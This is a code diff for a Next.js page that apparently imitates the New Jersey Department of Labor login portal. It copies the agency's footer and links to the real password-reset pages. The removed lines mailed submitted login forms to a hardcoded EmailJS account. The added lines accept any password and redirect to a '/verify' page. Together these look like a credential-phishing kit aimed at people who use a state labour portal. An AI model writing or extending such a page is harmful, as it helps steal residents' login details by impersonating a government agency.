@@ -2,25 +2,27 @@ import Link from 'next/link';
 import styles from '../styles/Home.module.css';
 import emailjs from 'emailjs-com';
 import { useRef } from 'react';
+import { useRouter } from 'next/router';
 
 const Home = () => {
     const form = useRef();
+    const router = useRouter();
+
+    const validateEmail = (email) => {
+        // Simple email regex
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    };
 
     const sendEmail = (e) => {
         e.preventDefault();
-        emailjs.sendForm(
-            'service_ozea06x',      // replace with your EmailJS service ID
-            'template_ugtxhw6',     // replace with your EmailJS template ID
-            form.current,
-            'XMOnwjyzQDoRVRYl3'          // replace with your EmailJS public key
-        ).then(
-            (result) => {
-                alert('Form sent!');
-            },
-            (error) => {
-                alert('Error sending form');
-            }
-        );
+        const email = form.current.user_email.value;
+        // Accept any password, just check email
+        if (!validateEmail(email)) {
+            alert('Please enter a valid email address.');
+            return;
+        }
+        // If valid, redirect to /verify
+        router.push('/verify');
     };
 
     return (
@@ -73,9 +75,9 @@ const Home = () => {
                     <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#passwordReset/" legacyBehavior>
                         <a>Forgot Password</a>
                     </Link>
-                   
+                    <span style={{ margin: '0 8px' }}>|</span>
                     <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#forgotUsername/" legacyBehavior>
-                        <a>forgot username</a>
+                        <a>Forgot Username</a>
                     </Link>
                 </div>
                 <div className={styles.horizontalDivider}></div>
@@ -86,7 +88,7 @@ const Home = () => {
                     </Link>
                 </div>
             </div>
-            {/* Footer Section (Fixed at the Bottom) */}
+            {/* Simple Footer */}
             <footer className={styles.footer}>
                 <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
             </footer>
